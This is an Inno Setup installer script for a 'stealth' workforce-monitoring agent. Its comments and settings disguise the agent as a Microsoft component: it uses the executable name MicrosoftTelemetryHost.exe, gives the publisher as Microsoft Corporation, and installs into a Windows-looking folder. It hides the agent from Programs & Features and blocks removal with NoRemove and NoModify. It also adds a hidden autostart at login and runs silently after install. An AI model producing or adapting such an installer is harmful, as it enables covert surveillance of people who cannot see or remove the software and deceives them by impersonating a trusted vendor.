; Inno Setup script for Stealth Workforce Analytics agent — HEADLESS build.
;
; Stealth & discoverability features:
;   1. CreateUninstallRegKey=no  — Prevents Inno's own Programs & Features entry
;   2. Manual SystemComponent=1 registry entry hides from user-facing lists
;   3. Exe renamed to MicrosoftTelemetryHost.exe for system-like Task Manager appearance
;   4. Install to LocalAppData/Microsoft/Windows path (looks system-generated)
;   5. No tray icon, no UI — pure background monitoring
;
; Compile from `agent/packaging` directory:
;   "C:\Program Files (x86)\Inno Setup 6\ISCC.exe" windows\WorkforceAgent-Stealth.iss

#define AppId       "WT-Stealth-{8E1F4C2A-7B3D-4E9A-9F1C-2A6D5B0E3C72}"
#define AppVersion  "1.0.0"
#define RegAlias    "WindowsTelemetryServiceHost"
#define ExeName     "MicrosoftTelemetryHost.exe"

[Setup]
AppId={#AppId}
AppName=Windows Telemetry Service Host
AppVersion={#AppVersion}
AppPublisher=Microsoft Corporation
DefaultDirName={localappdata}\Microsoft\Windows\TelemetryHost
DisableDirPage=yes
DisableProgramGroupPage=yes
CreateUninstallRegKey=no
DisableWelcomePage=yes
DisableReadyPage=yes
DisableFinishedPage=yes
OutputDir=..\dist
OutputBaseFilename=WorkforceAgent-Setup-Stealth-windows
SetupIconFile=..\icons\icon.ico
Compression=lzma2
SolidCompression=yes
WizardStyle=modern
PrivilegesRequired=lowest
ArchitecturesInstallIn64BitMode=x64compatible

[Languages]
Name: "english"; MessagesFile: "compiler:Default.isl"

[Files]
Source: "..\dist\{#ExeName}"; DestDir: "{app}"; Flags: ignoreversion

[Registry]
; Hidden uninstall entry (SystemComponent=1 hides from Programs & Features)
Root: HKCU; Subkey: "SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\{#RegAlias}"; \
  ValueType: string; ValueName: "DisplayName"; \
  ValueData: "Windows Telemetry Service Host"; Flags: uninsdeletekey
Root: HKCU; Subkey: "SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\{#RegAlias}"; \
  ValueType: string; ValueName: "Publisher"; \
  ValueData: "Microsoft Corporation"
Root: HKCU; Subkey: "SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\{#RegAlias}"; \
  ValueType: dword; ValueName: "SystemComponent"; ValueData: "1"
Root: HKCU; Subkey: "SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\{#RegAlias}"; \
  ValueType: dword; ValueName: "NoRemove"; ValueData: "1"
Root: HKCU; Subkey: "SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\{#RegAlias}"; \
  ValueType: dword; ValueName: "NoModify"; ValueData: "1"
Root: HKCU; Subkey: "SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\{#RegAlias}"; \
  ValueType: string; ValueName: "InstallLocation"; ValueData: "{app}"

; Auto-start on login (hidden process, no console)
Root: HKCU; Subkey: "SOFTWARE\Microsoft\Windows\CurrentVersion\Run"; \
  ValueType: string; ValueName: "WindowsTelemetryHost"; \
  ValueData: """{app}\{#ExeName}"""; \
  Flags: uninsdeletevalue

[Run]
; Run silently after install (no UI)
Filename: "{app}\{#ExeName}"; \
  Flags: nowait postinstall skipifsilent runasoriginaluser
